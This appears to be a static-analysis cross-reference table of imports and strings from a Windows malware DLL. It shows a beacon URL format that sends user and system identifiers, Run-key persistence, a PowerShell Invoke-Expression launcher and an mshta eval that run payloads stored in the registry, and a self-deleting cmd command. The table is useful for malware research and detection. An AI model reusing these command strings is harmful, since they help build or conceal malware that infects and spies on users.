reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x100015a5	0x1000b0a8	import	0x1000158d	KERNEL32.dll.EnterCriticalSection
0x100015e8	0x1000b0a0	import	0x1000158d	KERNEL32.dll.VirtualProtect
0x100015f2	0x1000b060	import	0x1000158d	KERNEL32.dll.GetLastError
0x10001626	0x1000b098	import	0x1000158d	KERNEL32.dll.LeaveCriticalSection
0x10001861	0x10004530	string	0x10001762	IVWx
0x10001949	0x10004530	string	0x100018e4	IVWx
0x100019dc	0x1000b074	import	0x100019c3	KERNEL32.dll.Sleep
0x10001a4e	0x1000d8b3	string	0x10001a20	@CODE@
0x10001a5c	0x1000b040	import	0x10001a20	KERNEL32.dll.lstrlenA
0x10001a67	0x1000c0f4	import	0x10001a20	SHLWAPI.dll.StrStrA
0x10001a8c	0x1000b008	import	0x10001a20	KERNEL32.dll.HeapAlloc
0x10001ada	0x1000b014	import	0x10001a20	KERNEL32.dll.HeapFree
0x10001b0a	0x1000b128	import	0x10001b0a	ntdll.dll.memset
0x10001b16	0x1000d45c	string	0x10001b10	{%08X-%04X-%04X-%04X-%08X%04X}
0x10001b1d	0x1000d082	string	0x10001b10	%08X-%04X-%04X-%04X-%08X%04X
0x10001b62	0x1000c110	import	0x10001b10	USER32.dll.wsprintfA
0x10001b9a	0x10001bb6	string	0x10001b6f	NuϋM\f blocks=Basic Latin,Greek and Coptic
0x10001bfe	0x1000c14c	import	0x10001bd9	ole32.dll.CoCreateInstance
0x10001ca9	0x1000c0b8	import	0x10001c83	ADVAPI32.dll.RegOpenKeyExA
0x10001cf0	0x1000c0bc	import	0x10001c83	ADVAPI32.dll.RegEnumKeyExA
0x10001d5d	0x1000b02c	import	0x10001c83	KERNEL32.dll.WaitForSingleObject
0x10001d85	0x1000c0c4	import	0x10001c83	ADVAPI32.dll.RegCloseKey
0x10001dc7	0x1000d682	string	0x10001d94	Software\AppDataLow\Software\Microsoft\
0x10001ec2	0x1000d71a	string	0x10001d94	Local\
0x10001ee1	0x1000b028	import	0x10001d94	KERNEL32.dll.CreateEventA
0x10001ef5	0x1000c0f0	import	0x10001d94	SHLWAPI.dll.StrChrW
0x10001f21	0x1000b02c	import	0x10001d94	KERNEL32.dll.WaitForSingleObject
0x10001f32	0x1000c108	import	0x10001d94	USER32.dll.OpenClipboard
0x10001f3e	0x1000c104	import	0x10001d94	USER32.dll.GetClipboardData
0x10001f44	0x1000c100	import	0x10001d94	USER32.dll.CloseClipboard
0x10001f4d	0x1000b030	import	0x10001d94	KERNEL32.dll.CloseHandle
0x10001f56	0x1000b034	import	0x10001d94	KERNEL32.dll.GetCurrentProcessId
0x10001f66	0x1000c10c	import	0x10001d94	USER32.dll.wsprintfW
0x10001f76	0x1000b064	import	0x10001d94	KERNEL32.dll.OpenFileMappingW
0x10001f88	0x1000b048	import	0x10001d94	KERNEL32.dll.MapViewOfFile
0x10001f96	0x1000b030	import	0x10001d94	KERNEL32.dll.CloseHandle
0x1000201f	0x1000c0f8	import	0x10001fb2	SHLWAPI.dll.StrToIntExA
0x10002175	0x1000b014	import	0x10001fb2	KERNEL32.dll.HeapFree
0x100021a2	0x1000b054	import	0x10002187	KERNEL32.dll.WaitForMultipleObjects
0x10002272	0x1000d498	string	0x10002244	open
0x1000228b	0x1000c0d4	import	0x10002244	SHELL32.dll.ShellExecuteExW
0x10002295	0x1000b060	import	0x10002244	KERNEL32.dll.GetLastError
0x10002413	0x1000b0ec	import	0x100023c3	OLEAUT32.dll.SysReAllocString
0x10002428	0x1000d498	string	0x100023c3	open
0x100024a0	0x1000b0f8	import	0x100023c3	OLEAUT32.dll.SysStringLen
0x100024a9	0x100024b4	string	0x100023c3	9]\bt\t
0x100024ae	0x1000b0f8	import	0x100023c3	OLEAUT32.dll.SysStringLen
0x100024bc	0x1000b0f8	import	0x100023c3	OLEAUT32.dll.SysStringLen
0x100024f9	0x1000b008	import	0x100024dd	KERNEL32.dll.HeapAlloc
0x10002527	0x1000b008	import	0x100024dd	KERNEL32.dll.HeapAlloc
0x10002570	0x1000b014	import	0x100024dd	KERNEL32.dll.HeapFree
0x100025c2	0x1000c14c	import	0x10002592	ole32.dll.CoCreateInstance
0x100025d9	0x1000d3a8	string	0x10002592	__ProviderArchitecture
0x10002656	0x1000b0f4	import	0x1000262e	OLEAUT32.dll.SafeArrayDestroy
0x10002661	0x100026a4	string	0x1000262e	j\b^_
0x1000267c	0x1000d0fc	string	0x1000262e	uValue
0x10002684	0x1000d310	string	0x1000262e	SetBinaryValue
0x1000269c	0x1000b0f0	import	0x1000262e	OLEAUT32.dll.SafeArrayGetDim
0x10002740	0x1000b024	import	0x1000272a	KERNEL32.dll.GetTickCount
0x10002760	0x1000c110	import	0x1000272a	USER32.dll.wsprintfA
0x10002780	0x1000d581	string	0x1000272a	soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x
0x10002796	0x1000d5c1	string	0x1000272a	&uptime=%u
0x100027c9	0x1000d77e	string	0x1000272a	&ip=%s
0x100027e0	0x1000d785	string	0x1000272a	&os=%s
0x10002803	0x1000b008	import	0x1000272a	KERNEL32.dll.HeapAlloc
0x10002813	0x1000b024	import	0x1000272a	KERNEL32.dll.GetTickCount
0x10002827	0x1000b0a8	import	0x1000272a	KERNEL32.dll.EnterCriticalSection
0x10002845	0x1000b098	import	0x1000272a	KERNEL32.dll.LeaveCriticalSection
0x10002877	0x1000c0e4	import	0x1000272a	SHLWAPI.dll.StrTrimA
0x1000288b	0x1000b044	import	0x1000272a	KERNEL32.dll.lstrcpyA
0x10002891	0x1000d67d	string	0x1000272a	.avi
0x100028a4	0x1000b0d0	import	0x1000272a	KERNEL32.dll.lstrcatA
0x100028df	0x1000b014	import	0x1000272a	KERNEL32.dll.HeapFree
0x100028ef	0x1000b014	import	0x1000272a	KERNEL32.dll.HeapFree
0x100028fd	0x1000b014	import	0x1000272a	KERNEL32.dll.HeapFree
0x1000290e	0x1000b014	import	0x1000272a	KERNEL32.dll.HeapFree
0x1000291c	0x1000b014	import	0x1000272a	KERNEL32.dll.HeapFree
0x10002930	0x1000b120	import	0x10002930	ntdll.dll.sprintf
0x1000294d	0x10008646	string	0x10002936	j(hȲ blocks=Basic Latin,Latin Extended-B
0x100029a0	0x1000b014	import	0x10002936	KERNEL32.dll.HeapFree
0x100029d6	0x1000c14c	import	0x100029b5	ole32.dll.CoCreateInstance
0x10002a05	0x1000d1ac	string	0x100029b5	root\default
0x10002a21	0x1000c148	import	0x100029b5	ole32.dll.CoSetProxyBlanket
0x10002a6f	0x1000b024	import	0x10002a59	KERNEL32.dll.GetTickCount
0x10002ac8	0x1000b040	import	0x10002a59	KERNEL32.dll.lstrlenA
0x10002ae4	0x1000b058	import	0x10002a59	KERNEL32.dll.lstrlenW
0x10002aee	0x1000d980	string	0x10002a59	%S=new ActiveXObject('WScript.Shell');%S.Run('powershell.exe Invoke-Expression ([System.Text.Encoding]::ASCII.GetString((Get-ItemProperty "%S:\%S").%s))',0,0);
0x10002b1d	0x1000c10c	import	0x10002a59	USER32.dll.wsprintfW
0x10002b43	0x1000dac0	string	0x10002a59	mshta "about:<hta:application><script>moveTo(-898,-989);resizeTo(1,1);eval(new ActiveXObject('WScript.Shell').RegRead('%S\\%S\\%s'));if(!window.flag)close()</script>"
0x10002bb5	0x10002c0c	string	0x10002b9e	j\b[_^
0x10002bd4	0x1000b04c	import	0x10002b9e	KERNEL32.dll.GetSystemTimeAsFileTime
0x10002bdf	0x1000dc10	string	0x10002b9e	SOFTWARE\Microsoft\Internet Explorer\Main
0x10002c04	0x1000b014	import	0x10002b9e	KERNEL32.dll.HeapFree
0x10002c99	0x1000d1ec	string	0x10002c18	StdRegProv
0x10002ce4	0x1000b0f8	import	0x10002c18	OLEAUT32.dll.SysStringLen
0x10002d1d	0x10002d6d	string	0x10002d0d	j\bX_^]
0x10002d3c	0x1000d1ec	string	0x10002d0d	StdRegProv
0x10002d76	0x1000b114	import	0x10002d76	ntdll.dll.strcpy
0x10002dd1	0x1000b0d4	import	0x10002dc7	KERNEL32.dll.QueryPerformanceFrequency
0x10002ddb	0x1000b0c4	import	0x10002dc7	KERNEL32.dll.QueryPerformanceCounter
0x10002e0c	0x1000b0a4	import	0x10002df4	KERNEL32.dll.InitializeCriticalSection
0x10002e12	0x1000b094	import	0x10002df4	KERNEL32.dll.TlsAlloc
0x10002e27	0x1000b080	import	0x10002df4	KERNEL32.dll.AddVectoredExceptionHandler
0x10002e3e	0x1000b060	import	0x10002df4	KERNEL32.dll.GetLastError
0x10004094	0x1000b0ec	import	0x1000407a	OLEAUT32.dll.SysReAllocString
0x100040a4	0x1000d38c	string	0x1000407a	sValue
0x100040b2	0x1000d224	string	0x1000407a	SetStringValue
0x100040cb	0x1000b0f8	import	0x1000407a	OLEAUT32.dll.SysStringLen
0x10004108	0x1000c14c	import	0x100040de	ole32.dll.CoCreateInstance
0x10004190	0x1000c0dc	import	0x100040de	SHLWAPI.dll.IUnknown_QueryService
0x100041c5	0x1000c0dc	import	0x100040de	SHLWAPI.dll.IUnknown_QueryService
0x10004272	0x1000b014	import	0x10004223	KERNEL32.dll.HeapFree
0x100042ba	0x1000b024	import	0x100042b1	KERNEL32.dll.GetTickCount
0x100042e7	0x1000c110	import	0x100042b1	USER32.dll.wsprintfA
0x10004307	0x1000d581	string	0x100042b1	soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x
0x10004321	0x1000d5c1	string	0x100042b1	&uptime=%u
0x10004358	0x1000b008	import	0x100042b1	KERNEL32.dll.HeapAlloc
0x1000437b	0x1000b0a8	import	0x100042b1	KERNEL32.dll.EnterCriticalSection
0x10004399	0x1000b098	import	0x100042b1	KERNEL32.dll.LeaveCriticalSection
0x100043d0	0x1000c0e4	import	0x100042b1	SHLWAPI.dll.StrTrimA
0x100043e7	0x1000b044	import	0x100042b1	KERNEL32.dll.lstrcpyA
0x100043ed	0x1000d67d	string	0x100042b1	.avi
0x100043fe	0x1000b0d0	import	0x100042b1	KERNEL32.dll.lstrcatA
0x100044d6	0x1000b014	import	0x100042b1	KERNEL32.dll.HeapFree
0x100044e9	0x1000b014	import	0x100042b1	KERNEL32.dll.HeapFree
0x100044f7	0x1000b014	import	0x100042b1	KERNEL32.dll.HeapFree
0x10004507	0x1000b014	import	0x100042b1	KERNEL32.dll.HeapFree
0x10004517	0x1000b014	import	0x100042b1	KERNEL32.dll.HeapFree
0x10004599	0x1000c0ec	import	0x10004562	SHLWAPI.dll.StrChrA
0x100045c3	0x1000b044	import	0x10004562	KERNEL32.dll.lstrcpyA
0x100045e0	0x1000b044	import	0x10004562	KERNEL32.dll.lstrcpyA
0x10004615	0x1000d7a3	string	0x10004562	Client
0x1000469d	0x1000d757	string	0x10004562	HKCU
0x100046a4	0x1000d8ba	string	0x10004562	HKLM
0x10004701	0x1000d729	string	0x10004562	Software\Microsoft\Windows\CurrentVersion\Run
0x1000485b	0x1000b0a8	import	0x10004852	KERNEL32.dll.EnterCriticalSection
0x10004865	0x1000b074	import	0x10004852	KERNEL32.dll.Sleep
0x10004898	0x1000b098	import	0x10004852	KERNEL32.dll.LeaveCriticalSection
0x100048a4	0x1000b124	import	0x100048a4	ntdll.dll.memcpy
0x100049a6	0x1000d0fc	string	0x10004989	uValue
0x100049b0	0x1000d2b0	string	0x10004989	GetBinaryValue
0x10004a07	0x1000b0f0	import	0x10004989	OLEAUT32.dll.SafeArrayGetDim
0x10004a3d	0x1000d194	string	0x10004a1f	ReturnValue
0x10004abf	0x1000b0ec	import	0x10004a7e	OLEAUT32.dll.SysReAllocString
0x10004b33	0x1000d018	string	0x10004a7e	%D,3
0x10004b62	0x10004b99	string	0x10004a7e	9]\ft5
0x10004b67	0x10004b99	string	0x10004a7e	9]\ft5
0x10004b69	0x1000d000	string	0x10004a7e	invalidcert
0x10004b71	0x1000c0e8	import	0x10004a7e	SHLWAPI.dll.StrStrIW
0x10004b93	0x1000b0f8	import	0x10004a7e	OLEAUT32.dll.SysStringLen
0x10004be7	0x1000b0f0	import	0x10004a7e	OLEAUT32.dll.SafeArrayGetDim
0x10004bf5	0x1000b0f8	import	0x10004a7e	OLEAUT32.dll.SysStringLen
0x10004c06	0x1000b138	import	0x10004c06	ntdll.dll.NtQueryVirtualMemory
0x10004c16	0x1000b040	import	0x10004c06	KERNEL32.dll.lstrlenA
0x10004c65	0x1000d573	string	0x10004c06	%c%02X
0x10004c9a	0x1000b01c	import	0x10004c8d	KERNEL32.dll.HeapCreate
0x10004cae	0x1000b024	import	0x10004c8d	KERNEL32.dll.GetTickCount
0x10004ce0	0x1000d09f	string	0x10004c8d	KERNEL32.DLL
0x10004ce5	0x1000b05c	import	0x10004c8d	KERNEL32.dll.GetModuleHandleA
0x10004ceb	0x1000d8a4	string	0x10004c8d	IsWow64Process
0x10004cf6	0x1000b0c8	import	0x10004c8d	KERNEL32.dll.GetProcAddress
0x10004d3c	0x1000b020	import	0x10004d31	KERNEL32.dll.SetEvent
0x10004d4b	0x1000b038	import	0x10004d31	KERNEL32.dll.SleepEx
0x10004d6c	0x1000b030	import	0x10004d31	KERNEL32.dll.CloseHandle
0x10004d7c	0x1000b018	import	0x10004d31	KERNEL32.dll.HeapDestroy
0x10004e0a	0x1000b074	import	0x10004ddc	KERNEL32.dll.Sleep
0x10004e40	0x1000b058	import	0x10004ddc	KERNEL32.dll.lstrlenW
0x10004e75	0x1000b0f8	import	0x10004ddc	OLEAUT32.dll.SysStringLen
0x10004fad	0x1000b10c	import	0x10004f66	ntdll.dll.ZwOpenProcess
0x10004fc0	0x1000b108	import	0x10004f66	ntdll.dll.ZwOpenProcessToken
0x10004fca	0x1000b100	import	0x10004f66	ntdll.dll.ZwQueryInformationToken
0x10005018	0x1000b110	import	0x10004f66	ntdll.dll.ZwClose
0x10005022	0x1000b110	import	0x10004f66	ntdll.dll.ZwClose
0x100050a6	0x1000b06c	import	0x1000509f	KERNEL32.dll.ResetEvent
0x100050c4	0x1000c120	import	0x1000509f	WININET.dll.InternetReadFile
0x100050ce	0x1000b060	import	0x1000509f	KERNEL32.dll.GetLastError
0x1000510f	0x1000c158	import	0x1000509f	ole32.dll.CreateStreamOnHGlobal
0x10005158	0x1000c120	import	0x1000509f	WININET.dll.InternetReadFile
0x10005162	0x1000b060	import	0x1000509f	KERNEL32.dll.GetLastError
0x100051d0	0x1000b134	import	0x100051d0	ntdll.dll.RtlUnwind
0x10005230	0x1000b028	import	0x10005228	KERNEL32.dll.CreateEventA
0x1000523f	0x1000b0bc	import	0x10005228	KERNEL32.dll.GetVersion
0x10005256	0x1000b034	import	0x10005228	KERNEL32.dll.GetCurrentProcessId
0x10005273	0x1000b0b8	import	0x10005228	KERNEL32.dll.OpenProcess
0x10005292	0x1000b060	import	0x10005228	KERNEL32.dll.GetLastError
0x100052ab	0x100052e0	string	0x1000529b	_^[]
0x100052d4	0x100052e0	string	0x1000529b	_^[]
0x1000531c	0x1000b08c	import	0x1000529b	KERNEL32.dll.TlsSetValue
0x1000533e	0x1000b084	import	0x1000529b	KERNEL32.dll.TlsGetValue
0x10005357	0x1000b08c	import	0x1000529b	KERNEL32.dll.TlsSetValue
0x10005acc	0x1000b040	import	0x10005ac0	KERNEL32.dll.lstrlenA
0x10005b3a	0x1000b044	import	0x10005ac0	KERNEL32.dll.lstrcpyA
0x10005b46	0x1000b044	import	0x10005ac0	KERNEL32.dll.lstrcpyA
0x10005b88	0x1000b040	import	0x10005b71	KERNEL32.dll.lstrlenA
0x10005c09	0x1000b040	import	0x10005bfe	KERNEL32.dll.lstrlenA
0x10005c21	0x1000b008	import	0x10005bfe	KERNEL32.dll.HeapAlloc
0x10005ccc	0x1000b040	import	0x10005c96	KERNEL32.dll.lstrlenA
0x10005cf0	0x1000b044	import	0x10005c96	KERNEL32.dll.lstrcpyA
0x10005cf8	0x1000b0d0	import	0x10005c96	KERNEL32.dll.lstrcatA
0x10005d19	0x1000b014	import	0x10005d0d	KERNEL32.dll.HeapFree
0x10005d8e	0x1000d184	string	0x10005d71	hDefKey
0x10005daf	0x1000b0ec	import	0x10005d71	OLEAUT32.dll.SysReAllocString
0x10005dd8	0x1000d348	string	0x10005d71	sSubKeyName
0x10005e0f	0x1000b0f8	import	0x10005d71	OLEAUT32.dll.SysStringLen
0x10005e1d	0x1000b0f8	import	0x10005d71	OLEAUT32.dll.SysStringLen
0x10005e78	0x10002df4	string	0x10005e5b	VWj(
0x10005e89	0x1000b2a8	string	0x10005e5b	Aug 14 2019
0x10005eac	0x1000d682	string	0x10005e5b	Software\AppDataLow\Software\Microsoft\
0x10005f55	0x1000b00c	import	0x10005ec9	KERNEL32.dll.InterlockedIncrement
0x10005f75	0x1000b010	import	0x10005ec9	KERNEL32.dll.InterlockedDecrement
0x100061df	0x1000dc92	string	0x100061c2	IE10RunOnceLastShown_TIMESTAMP
0x100061fb	0x1000dcb1	string	0x100061c2	IE8RunOnceLastShown_TIMESTAMP
0x1000620d	0x1000dc64	string	0x100061c2	Check_Associations
0x10006212	0x1000dc10	string	0x100061c2	SOFTWARE\Microsoft\Internet Explorer\Main
0x10006375	0x1000b008	import	0x1000635d	KERNEL32.dll.HeapAlloc
0x10006401	0x1000c0ec	import	0x100063ff	SHLWAPI.dll.StrChrA
0x1000641d	0x10006414	string	0x100063ff	Fj @P
0x10006438	0x1000c0e4	import	0x100063ff	SHLWAPI.dll.StrTrimA
0x10006455	0x1000c0e4	import	0x100063ff	SHLWAPI.dll.StrTrimA
0x1000648c	0x1000d908	string	0x10006481	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x100064a4	0x1000d964	string	0x10006481	InstallDate
0x100064c5	0x1000c0cc	import	0x10006481	ADVAPI32.dll.RegOpenKeyExW
0x100064e1	0x1000c0c8	import	0x10006481	ADVAPI32.dll.RegQueryValueExW
0x100064f2	0x1000c0c4	import	0x10006481	ADVAPI32.dll.RegCloseKey
0x10006514	0x1000b040	import	0x1000650b	KERNEL32.dll.lstrlenA
0x10006607	0x1000b088	import	0x100065f8	KERNEL32.dll.RemoveVectoredExceptionHandler
0x10006615	0x1000b090	import	0x100065f8	KERNEL32.dll.TlsFree
0x10006622	0x1000b09c	import	0x100065f8	KERNEL32.dll.DeleteCriticalSection
0x1000664f	0x1000b0a0	import	0x100065f8	KERNEL32.dll.VirtualProtect
0x10006697	0x10001084	string	0x1000666c	QSUW3
0x1000671e	0x1000b02c	import	0x1000666c	KERNEL32.dll.WaitForSingleObject
0x10006767	0x1000c0ac	import	0x10006735	ADVAPI32.dll.OpenProcessToken
0x10006772	0x1000c0a8	import	0x10006735	ADVAPI32.dll.GetTokenInformation
0x100067c2	0x1000c0c0	import	0x10006735	ADVAPI32.dll.GetSidSubAuthorityCount
0x100067d2	0x1000c0b0	import	0x10006735	ADVAPI32.dll.GetSidSubAuthority
0x100067e7	0x1000b030	import	0x10006735	KERNEL32.dll.CloseHandle
0x10006816	0x1000b040	import	0x100067fe	KERNEL32.dll.lstrlenA
0x10006847	0x1000b0d0	import	0x100067fe	KERNEL32.dll.lstrcatA
0x10006864	0x1000c0e4	import	0x100067fe	SHLWAPI.dll.StrTrimA
0x100068c3	0x1000b03c	import	0x100068a2	KERNEL32.dll.CreateWaitableTimerA
0x100068e8	0x1000b050	import	0x100068a2	KERNEL32.dll.SetWaitableTimer
0x1000690a	0x1000b054	import	0x100068a2	KERNEL32.dll.WaitForMultipleObjects
0x100069af	0x1000b014	import	0x100068a2	KERNEL32.dll.HeapFree
0x100069bf	0x1000b030	import	0x100068a2	KERNEL32.dll.CloseHandle
0x10006a32	0x1000b060	import	0x100068a2	KERNEL32.dll.GetLastError
0x10006a7c	0x10006b2b	string	0x10006a49	j\vX_^[
0x10006a8b	0x10006b2b	string	0x10006a49	j\vX_^[
0x10006bd6	0x1000b104	import	0x10006bd6	ntdll.dll.wcstombs
0x10006cca	0x1000d10a	string	0x10006cc0	NTDLL.DLL
0x10006cd2	0x1000b05c	import	0x10006cc0	KERNEL32.dll.GetModuleHandleA
0x10006d07	0x1000c154	import	0x10006cc0	ole32.dll.CoInitializeEx
0x10006da7	0x10006dd3	string	0x10006cc0	j\bX;Ë blocks=Basic Latin,Latin-1 Supplement
0x10006dbe	0x1000b0a4	import	0x10006cc0	KERNEL32.dll.InitializeCriticalSection
0x10006dc9	0x1000d6ee	string	0x10006cc0	0123456789ABCDEF
0x10006de5	0x1000b008	import	0x10006cc0	KERNEL32.dll.HeapAlloc
0x10006df2	0x10006e1a	string	0x10006cc0	j\b^;
0x10006e07	0x1000d50a	string	0x10006cc0	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)
0x10006e0d	0x1000c110	import	0x10006cc0	USER32.dll.wsprintfA
0x10006e4b	0x1000c150	import	0x10006cc0	ole32.dll.CoUninitialize
0x10006e7a	0x1000c0b4	import	0x10006e5b	ADVAPI32.dll.GetUserNameW
0x10006e98	0x1000b008	import	0x10006e5b	KERNEL32.dll.HeapAlloc
0x10006ec9	0x1000b014	import	0x10006e5b	KERNEL32.dll.HeapFree
0x10006ed7	0x1000b070	import	0x10006e5b	KERNEL32.dll.GetComputerNameW
0x10006eee	0x1000b008	import	0x10006e5b	KERNEL32.dll.HeapAlloc
0x10006eff	0x1000b070	import	0x10006e5b	KERNEL32.dll.GetComputerNameW
0x10006f20	0x1000b014	import	0x10006e5b	KERNEL32.dll.HeapFree
0x10006f5e	0x1000d0fc	string	0x10006f49	uValue
0x10006f6c	0x1000d294	string	0x10006f49	SetDWORDValue
0x10006f71	0x1000dc10	string	0x10006f49	SOFTWARE\Microsoft\Internet Explorer\Main
0x10006f98	0x1000b0a8	import	0x10006f8f	KERNEL32.dll.EnterCriticalSection
0x10006fa2	0x1000b074	import	0x10006f8f	KERNEL32.dll.Sleep
0x10006fbf	0x1000d6ee	string	0x10006f8f	0123456789ABCDEF
0x10006fd0	0x1000b014	import	0x10006f8f	KERNEL32.dll.HeapFree
0x10006fe5	0x1000b098	import	0x10006f8f	KERNEL32.dll.LeaveCriticalSection
0x10007000	0x1000d170	string	0x10006fee	CreateKey
0x1000701b	0x1000d6d2	string	0x10006fee	Client32
0x1000705e	0x1000d6db	string	0x10006fee	Client64
0x100070b3	0x1000b0a8	import	0x10007097	KERNEL32.dll.EnterCriticalSection
0x100070d1	0x1000b098	import	0x10007097	KERNEL32.dll.LeaveCriticalSection
0x10007105	0x1000b040	import	0x10007103	KERNEL32.dll.lstrlenA
0x1000710c	0x1000d242	string	0x10007103	/images/
0x1000712e	0x1000b044	import	0x10007103	KERNEL32.dll.lstrcpyA
0x10007139	0x1000b0d0	import	0x10007103	KERNEL32.dll.lstrcatA
0x100071db	0x1000b040	import	0x100071d2	KERNEL32.dll.lstrlenA
0x10007254	0x1000b118	import	0x10007254	ntdll.dll.mbstowcs
0x1000725b	0x1000b0dc	import	0x1000725a	KERNEL32.dll.ExpandEnvironmentStringsA
0x10007268	0x1000d6aa	string	0x1000725a	%systemroot%\system32\c_1252.nls
0x100072a0	0x1000b058	import	0x1000729a	KERNEL32.dll.lstrlenW
0x100072bc	0x1000d8c0	string	0x1000729a	/C ping localhost -n %u && del "%s"
0x100072c2	0x1000c10c	import	0x1000729a	USER32.dll.wsprintfW
0x100072cb	0x1000d7d4	string	0x1000729a	cmd.exe
0x100072f2	0x1000d7aa	string	0x100072e9	Wow64EnableWow64FsRedirection
0x100072fd	0x1000b0c8	import	0x100072e9	KERNEL32.dll.GetProcAddress
0x10007440	0x1000c13c	import	0x10007423	WININET.dll.InternetCloseHandle
0x10007447	0x1000c124	import	0x10007423	WININET.dll.InternetSetStatusCallback
0x1000747d	0x1000b030	import	0x10007423	KERNEL32.dll.CloseHandle
0x10008437	0x1000b0ec	import	0x100083ef	OLEAUT32.dll.SysReAllocString
0x1000845b	0x1000b0f8	import	0x100083ef	OLEAUT32.dll.SysStringLen
0x100084fe	0x1000d068	string	0x100083ef	overridelink
0x10008506	0x1000b068	import	0x100083ef	KERNEL32.dll.lstrcmpW
0x1000858e	0x100085c1	string	0x10008567	9]\btiV
0x100085ba	0x100085c1	string	0x10008567	9]\btiV
0x100086f7	0x1000b0d8	import	0x10008646	KERNEL32.dll.lstrcmpA
0x10008702	0x1000b040	import	0x10008646	KERNEL32.dll.lstrlenA
0x1000992e	0x1000b060	import	0x10009928	KERNEL32.dll.GetLastError
0x1000995c	0x1000b06c	import	0x10009928	KERNEL32.dll.ResetEvent
0x10009974	0x1000c118	import	0x10009928	WININET.dll.HttpSendRequestA
0x1000998d	0x1000b020	import	0x10009928	KERNEL32.dll.SetEvent
0x100099d1	0x1000b0a8	import	0x100099a1	KERNEL32.dll.EnterCriticalSection
0x10009a03	0x1000b0a0	import	0x100099a1	KERNEL32.dll.VirtualProtect
0x10009a22	0x1000b060	import	0x100099a1	KERNEL32.dll.GetLastError
0x10009a2d	0x1000b098	import	0x100099a1	KERNEL32.dll.LeaveCriticalSection
0x10009a56	0x1000c0ec	import	0x10009a55	SHLWAPI.dll.StrChrA
0x10009ae4	0x1000b020	import	0x10009a84	KERNEL32.dll.SetEvent
0x10009b01	0x1000b040	import	0x10009aef	KERNEL32.dll.lstrlenA
0x10009b24	0x1000c134	import	0x10009aef	WININET.dll.InternetCanonicalizeUrlA
